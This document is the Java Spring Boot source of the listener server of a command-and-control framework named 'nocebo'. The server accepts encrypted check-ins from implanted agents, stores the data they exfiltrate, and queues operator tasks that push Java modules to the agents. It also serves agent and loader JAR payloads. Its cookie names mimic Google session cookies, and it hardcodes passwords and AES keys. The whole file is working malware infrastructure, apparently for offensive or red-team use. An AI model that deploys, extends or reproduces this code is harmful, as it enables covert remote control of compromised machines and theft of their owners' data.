package com.nocebo.listener;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.security.servlet.SecurityAutoConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.MediaType;
import org.springframework.http.HttpStatus;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.annotation.RequestScope;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;

import java.security.InvalidAlgorithmParameterException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.AlgorithmParameterSpec;

import javax.crypto.AEADBadTagException;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.InvalidKeyException;
import java.security.SecureRandom;
import java.security.MessageDigest;

import javax.crypto.IllegalBlockSizeException;

import java.io.File;
import java.io.StringWriter;
import java.net.URI;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.Map;
import java.util.Base64;
import java.util.Random;
import java.util.Enumeration;
import java.util.Set;
import java.util.UUID;
import java.util.Arrays;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;

import java.text.SimpleDateFormat;

@SpringBootApplication(exclude = { SecurityAutoConfiguration.class })
public class ListenerApplication {

	public static void main(String[] args) {
		SpringApplication.run(ListenerApplication.class, args);
	}

	@RestController
	class noceboEndpoints
	{
		static noceboApi.security sapi = new noceboApi.security();
		static noceboApi.noceboApiUtil napi = new noceboApi.noceboApiUtil();
		static endpointConfig epc = new endpointConfig();
	
		static class endpointConfig
		{
			static String passwd = "T__+Pmv.REW=u9iXBB-";
			static String userpass = "SiAp++Em=@vBnQo0_";
			static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
			static String apiKey = "a18b25f2-6045-4aa2-b0b5-1dae01aa4f9a";
			static String apiPass = "882fb2a4-23ed-46c3-b005-83b71c554845";
			static String agentKey = "q8uf6,p2m1@31395aO+g+9592_4891lS";
			static Hashtable<String,session> sessionTable = new Hashtable();
		}

		@PostMapping("/60000")
		String auth(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			session sessionData;
			String currentKey;
			//validate auth first
			System.out.println(requestData);

			if (!epc.sessionTable.containsKey(idCookie))
			{
				sessionData = new session();
				sessionData.nonce = idCookie.substring(0,12).replace("-","");
				sessionData.tasks.add(napi.mkTask("autoLib","metadata",idCookie,new String()));
				sessionData.encKey = napi.strand(32);
				sessionData.downstream = new ArrayList();
				currentKey = epc.encKey;
			}
			else
			{
				sessionData = (session) epc.sessionTable.get(idCookie);
				currentKey = sessionData.encKey;
			}

			byte[] rawPostData = Base64.getUrlDecoder().decode(requestData.replace("=","").getBytes(StandardCharsets.UTF_8));
			byte[] decryptedData;
			try 
			{
				decryptedData = sapi.decrypt(rawPostData,sessionData.nonce.getBytes(StandardCharsets.UTF_8),currentKey);
			}
			catch (AEADBadTagException e)
			{
				//encryption error
				return "error.0x7461676D";
			}


			Hashtable xmlParsed = napi.xmlExfilToHashtable(new String(decryptedData));

			if (!xmlParsed.get("aKey").toString().equals(epc.passwd))
			{
				//bad password
				return "error.0x61757468";	
			}

			ArrayList downstreamData = new ArrayList<String>(Arrays.asList(xmlParsed.get("downstream").toString().split(",")));

			for (int d=0;d<downstreamData.size();d++)
			{
				String downstreamUUID = downstreamData.get(d).toString();
				System.out.println(downstreamUUID);
				if (!sessionData.downstream.contains(downstreamUUID) && !downstreamUUID.equals(""))
				{
					sessionData.downstream.add(downstreamUUID);
				}
			}


			sessionData.cookie = napi.mkCookie(idCookie, epc.passwd);
			sessionData.lastSeen = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
			
			String newNonce = napi.strand(12);

			String retrDoc = napi.xmlDocToString(napi.outputToXmlDoc(sessionData.cookie, sessionData.encKey, newNonce, sessionData.tasks));

			String retrData = new String(
				Base64.getEncoder().encode(
					sapi.encrypt(
						retrDoc.getBytes(StandardCharsets.UTF_8),
						sessionData.nonce.getBytes(StandardCharsets.UTF_8),
						currentKey
					)
				)
			);

			sessionData.downstream = downstreamData;
			sessionData.nonce = newNonce;
			sessionData.tasks = new ArrayList();
			epc.sessionTable.put(idCookie,sessionData);

			return retrData;
		}

		@PostMapping("/60001")
		String data(@RequestBody String requestData, @CookieValue("__Secure-3PSIDCC") String authCookie, @CookieValue("uuid") String idCookie) throws Exception, NoSuchAlgorithmException, IOException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			session sessionData;
			System.out.println("receiving data");
			System.out.println(requestData.replace("=",""));

			if (!epc.sessionTable.keySet().contains(idCookie))
			{
				//bad cookie
				return "error.0x73657373";
			}
			else
			{
				sessionData  = (session) epc.sessionTable.get(idCookie);
				if (!sessionData.cookie.equals(authCookie))
				{
					
					return "error.0x73657373";
				}
			}

			Hashtable xmlParsed = napi.xmlExfilToHashtable(
				new String(
					sapi.decrypt(
						Base64.getUrlDecoder().decode(
							requestData.replace("=","").getBytes()
						), 
						sessionData.nonce.getBytes(),
						sessionData.encKey
					)
				)
			);
			System.out.println("printing data");
			System.out.println(xmlParsed.toString());

			sessionData.data.add(xmlParsed);

			return "ok";
		}

		@RequestMapping("/59009")
		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
		ResponseEntity<String> download(@CookieValue("__Secure-YEC") String apiKeyData) throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			String apiKeyDecoded = new String(Base64.getDecoder().decode(apiKeyData));
			if (!apiKeyDecoded.equals(epc.apiKey))
			{
				return new ResponseEntity<String>("error.0x73657373",null,HttpStatus.FORBIDDEN);
			}

			//use .substring(0,12).replace("-",""); on agent
			String downloadNonce = String.join(
				"-", 
				new String[] {
					napi.strand(8),
					napi.strand(4),
					napi.strand(4),
					napi.strand(4),
					napi.strand(12)
				}
			);

			HttpHeaders respHeaders = new HttpHeaders();
    		respHeaders.set("uuid", downloadNonce);

			ArrayList respoData = new ArrayList();
			Hashtable<String,byte[]> retrData = napi.mkRespoData("iAgent");

			Enumeration<String> c = retrData.keys();
			while (c.hasMoreElements())
			{
				String cFileName = c.nextElement();
					String cData = new String(
						Base64.getEncoder().encode(
							sapi.encrypt(
								retrData.get(cFileName),
								downloadNonce.substring(0,12).replace("-","").getBytes(StandardCharsets.UTF_8),
								epc.agentKey
							)
						)
					);
				respoData.add(String.format("%s.%s",cFileName,cData));
			}
    		return new ResponseEntity<String>(String.join("|",respoData), respHeaders, HttpStatus.OK);

		}

		@RequestMapping(value = "/59013",produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
		@ResponseBody byte[] downloadStub() throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			System.out.println("stub downloading");
			//encrypt


			String filePath = String.format("..%sfileroot%slib%siAgent.jar",File.separator,File.separator,File.separator,File.separator);
			byte[] fileData = Files.readAllBytes(Paths.get(filePath));
			
			return fileData;
		}

		@RequestMapping("/59053")
		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
		String downloadILoader() throws Exception, IOException, NoSuchAlgorithmException, ParserConfigurationException, SAXException, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			String filePath = String.format("..%s..%sfileroot%slib%siLoader.jar",File.separator,File.separator,File.separator,File.separator);
			String cName = new String(
						Base64.getEncoder().encode(
							Files.readAllBytes(Paths.get(filePath))
						)
					);
			return cName;
		}

		@PostMapping("/tasking")
		String ctrl(@RequestBody Map<String, Object> requestData, @RequestHeader("nClient-key") String clientApiKey) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
		{
			System.out.println((String) requestData.get("uuid"));
			if (!clientApiKey.equals(epc.apiPass))
			{
				return "Fatal Error: Incorrect API key";
			}

			ArrayList<session> sessionData = new ArrayList();
			boolean foundDownstream = false;

			if (!epc.sessionTable.containsKey((String) requestData.get("uuid")))
			{
				Enumeration<String> k = epc.sessionTable.keys();
				while (k.hasMoreElements())
				{
					String sessionKey = k.nextElement();
					session tempSessionData = (session) epc.sessionTable.get(sessionKey);
					System.out.println(sessionKey);
					if (tempSessionData.downstream.contains((String) requestData.get("uuid")))
					{
						sessionData.add(tempSessionData);
					}
				}
				
				if (!foundDownstream)
				{
					return "Fatal Error: Specified agent session UUID not found in upstream or downstream session objects. Agent associated with session ID is most likely dead.";
				}
			}
			else
			{
				sessionData.add((session) epc.sessionTable.get((String) requestData.get("uuid")));
			}
			

			Hashtable newTask = napi.mkTask(
				(String) requestData.get("className"),
				(String) requestData.get("methodName"),
				(String) requestData.get("uuid"),
				requestData.get("args").toString()
			);

			for (int s=0; s<sessionData.size();s++)
			{
				sessionData.get(s).tasks.add(
					newTask
				);
			}

			return String.format("Successfully added task: %s", newTask.toString());
		}

		@RequestMapping("/log")
		//String log(@RequestBody noceboApiRequest requestData, @CookieValue("nocebo.auth") String authCookie)
		String log(@RequestHeader("nClient-key") String clientApiKey)
		{


				
			if (!clientApiKey.equals(epc.apiPass))
			{
				return "Fatal Error: Incorrect API key";
			}
			//put authenticator in front
			ArrayList data = new ArrayList();

			Enumeration<String> k = epc.sessionTable.keys();
			while (k.hasMoreElements())
			{
				String sessionKey = k.nextElement();
				session sessionData = (session) epc.sessionTable.get(sessionKey);
				Hashtable sessionRepresentative = new Hashtable();

				sessionRepresentative.put("tasks",sessionData.tasks.size());
				sessionRepresentative.put("lastSeen",sessionData.lastSeen);
				sessionRepresentative.put("data",sessionData.data);
				sessionRepresentative.put("uuid",sessionKey);
				sessionRepresentative.put("downstream",sessionData.downstream.toString());

				data.add(sessionRepresentative.toString());
			}

			return data.toString();
		}

		//@RequestMapping("/auth")
		//String auth(@RequestBody noceboApiRequest requestData)
		//{

		//}
		class session
		{
			static String cookie = new String();
			static ArrayList tasks = new ArrayList();
			static String lastSeen = new String();
			static ArrayList data = new ArrayList();
			static String encKey = new String();
			static String nonce = new String();
			static ArrayList downstream = new ArrayList();
		}
	
	
		static class noceboApiCommand
		{
			//static ArrayList<noceboApiCommand> Data = new ArrayList<noceboApiCommand>();
	
			String className;
			String methodName;
			String args;
			String uuid;
	

		}

	}
}

class noceboApi
{

	@Configuration
	class SecurityConfig
	{
		@Bean
 		SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
			return http
      			.requiresChannel(channel -> 
          			channel.anyRequest().requiresSecure())
      			.authorizeRequests(authorize ->
          			authorize.anyRequest().permitAll())
      			.build();
    	}

	}

	static class noceboApiUtil
	{

		public Hashtable<String, byte[]> mkRespoData(String keyWord) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
		{
			Hashtable<String, byte[]> retrData = new Hashtable();
			File folder = new File(String.format("..%sfileroot%scom%snocebo%snCore",File.separator,File.separator,File.separator,File.separator));
			File[] listOfFiles = folder.listFiles();
			
			for (int f=0;f<listOfFiles.length;f++)
			{
				String fName = listOfFiles[f].getName();
				if (fName.contains(keyWord))
				{
					byte[] fileData = Files.readAllBytes(listOfFiles[f].toPath().toAbsolutePath());
					String cName = new String(
						Base64.getEncoder().encode(
							fName.replace(".class","").getBytes(StandardCharsets.UTF_8)
						)
					);

					
					retrData.put(cName,fileData);

				}
			}
			return retrData;
		}

		public Hashtable mkTask(String className, String methodName, String uuid, String args) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
		{
			Hashtable<String, byte[]> modDataSet = mkRespoData(className);
			ArrayList modData = new ArrayList();

			Enumeration<String> c = modDataSet.keys();
			while (c.hasMoreElements())
			{
				String cFileName = c.nextElement();

				String cFileData = new String(
						Base64.getEncoder().encode(
							modDataSet.get(cFileName)
						)
					);

					
				modData.add(String.format("%s.%s",cFileName,cFileData));
			}

			String argData = new String(
				Base64.getEncoder().encode(
					args.getBytes()
				)
			);


			Hashtable taskData = new Hashtable();

			taskData.put("uuid",uuid);
			taskData.put("class",className);
			taskData.put("method",methodName);
			taskData.put("args",argData);
			taskData.put("mod",String.join("|", modData));
			

			return taskData;
		}

		public int rngenerator(int min, int max) throws NoSuchAlgorithmException 
		{
			SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
			int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
			return randNum;
		}

		public String strand(int strLen) throws NoSuchAlgorithmException {
			//random string, for nonces and such
			String asciiChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			StringBuilder randStr = new StringBuilder();
			for (int x=0; x<strLen; x++) {
				SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
				randStr.append(asciiChars.charAt(rHandle.nextInt(asciiChars.length())));
			}
			return randStr.toString();
		}

		public String mkCookie(String uuid, String passwd) throws NoSuchAlgorithmException
		{
			String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
			Hashtable cookieMaterialRaw = new Hashtable();

			cookieMaterialRaw.put("tstamp",timeStamp);
			cookieMaterialRaw.put("uuid",uuid);
			cookieMaterialRaw.put("passwd",passwd);
			cookieMaterialRaw.put("randPadding",strand(8));

			MessageDigest digest = MessageDigest.getInstance("SHA-256");
			byte[] encodedHash = digest.digest(
				cookieMaterialRaw.toString().getBytes(StandardCharsets.UTF_8)
			);
			return new String(Base64.getEncoder().encode(encodedHash));
		}

		//<response><nonce data=""></nonce><cookie data=""><key data=""></key></cookie><task class="" method="" args="b64">b64moddata</task></response>
		public Document outputToXmlDoc(String cookie, String encKey, String nonce, ArrayList tasks) throws ParserConfigurationException
		{
			DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
			DocumentBuilder constructor = manufactorum.newDocumentBuilder();

			Document doc = constructor.newDocument();

			Element root = doc.createElement("response");
			doc.appendChild(root);
		
			Element cElement = doc.createElement("cookie");
			cElement.setAttribute("data", cookie);
			root.appendChild(cElement);

			Element kElement = doc.createElement("key");		
			kElement.setAttribute("data", encKey);
			root.appendChild(kElement);
			
			Element nElement = doc.createElement("nonce");		
			nElement.setAttribute("data", nonce);
			root.appendChild(nElement);
			

			//task parsing
			for (int q=0; q<tasks.size(); q++)
			{
				Hashtable taskDescriptor = (Hashtable) tasks.get(q);

				Enumeration<String> k = taskDescriptor.keys();
				Element tElement = doc.createElement("task");

				while (k.hasMoreElements())
				{
					String key = k.nextElement();
					if (key.toString() == "mod")
					{
						tElement.setTextContent(
							taskDescriptor.get(key.toString()).toString()
						);
					}
					else
					{
						tElement.setAttribute(
							key.toString(),
							taskDescriptor.get(key.toString()).toString()
						);
					}
				}
				root.appendChild(tElement);
			}

			return doc;

		}

		public Hashtable xmlExfilToHashtable(String xmlPostData) throws ParserConfigurationException, IOException, SAXException
		{
			//<modname><fieldname data=""></modname>
			Hashtable xmlParsed = new Hashtable();

			DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
			DocumentBuilder constructor = manufactorum.newDocumentBuilder();
			Document doc = constructor.parse(new InputSource(new StringReader(xmlPostData)));

			Element rootElement = doc.getDocumentElement();

			NodeList nl = rootElement.getChildNodes();
			for (int n=0;n<nl.getLength();n++)
			{
				Node nodeData = nl.item(n);
				Element nodeElement = (Element) nodeData;
				xmlParsed.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
			}
			return xmlParsed;
		}

		public String xmlDocToString(Document xmlDoc) throws TransformerException
		{
			TransformerFactory tFacInst = TransformerFactory.newInstance();
			Transformer tFac = tFacInst.newTransformer();
			StringWriter stWrite = new StringWriter();
			tFac.transform(new DOMSource(xmlDoc), new StreamResult(stWrite));
			return stWrite.toString();
		}
	}

	static class security
	{
		//replicates my lycanthropy aesgcm
		public byte[] encrypt(byte[] plaintext, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			SecretKey key = initKey(keyData);
			Cipher cipher = initCipher();

			AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
			cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
			return cipher.doFinal(plaintext);
		}

		public byte[] decrypt(byte[] encrypted, byte[] nonce, String keyData) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
		{
			SecretKey key = initKey(keyData);
			Cipher cipher = initCipher();

			AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
			cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
			return cipher.doFinal(encrypted);
		}

		private Cipher initCipher() throws Exception
		{
			Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
			return cipher;
		}

		private SecretKey initKey(String encKey) throws Exception
		{
			byte[] keyBytes = encKey.getBytes(StandardCharsets.UTF_8);
			SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
			return key;
		}
	}
}

